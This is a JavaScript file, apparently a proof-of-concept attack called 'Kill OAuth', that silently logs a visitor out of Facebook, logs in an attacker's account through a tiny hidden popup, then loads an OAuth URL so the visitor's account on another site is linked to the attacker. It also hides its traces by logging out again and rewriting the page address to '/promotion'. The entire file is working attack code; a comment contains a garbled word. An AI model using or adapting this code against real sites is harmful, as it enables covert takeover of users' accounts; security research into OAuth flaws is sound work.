/**
    Our attack technique (of opening a window to log in the user) is
    similanctir to the one Sakurity uses for their RECONNECT demo.
*/
var KO = {
 
   attackurl: "https://apps.facebook.com/183806791631057/",
   oauthurl: "",
   logout: function () {
       KO.geturl('https://www.facebook.com/n/?mid=9dd1fd7G5af48de9ca58G0G86G119bb48c');
   },
   gethash: function (desiredkey) {
       /** 
           Get a value from the hash
       */
       var hash = window.location.hash;
       var items = hash.split('&');
       
       for(var i = 0; i < items.length; i++) {
           var keyval = items[i].split("="); 
           var k = keyval[0];
           var v = keyval[1];
           
           if (desiredkey === k) {
              return decodeURI(v);  
           }
       }
       
       return null;
   },
   attack: function () {
      /*
        Log out the current user, and then log in the attacker.
      */
      KO.log('logging out the current user');
      KO.logout();

      KO.log('logging in the attacker');

      var login = window.open(KO.attackurl, '_blank', 'height=1,width=1');
      window.focus();

      setTimeout(function () {
  
          /** Close the window */
          login.close();
    
          /** Steal their account. */
          var oauthurl = KO.oauthurl;
          KO.geturl(oauthurl);

          /** Leave no trace. */ 
          KO.logout();
      }, 4000);
   },
   log: function (msg) {
       console.log('Kill OAuth:' + msg);
   },
   geturl: function (url) {
       /**
         Fetch a URL through a GET request.
       */
       var img = document.createElement('img');
       img.src = url;
       img.style.display = "none";
       
       document.body.appendChild(img);
   }
};

(function () {
    /**
        Get the oauth url and revise our browser url.
    */
    var url = KO.gethash('oauthurl');
    KO.oauthurl = url;
 
    window.history.replaceState(null, null, '/promotion');
})();
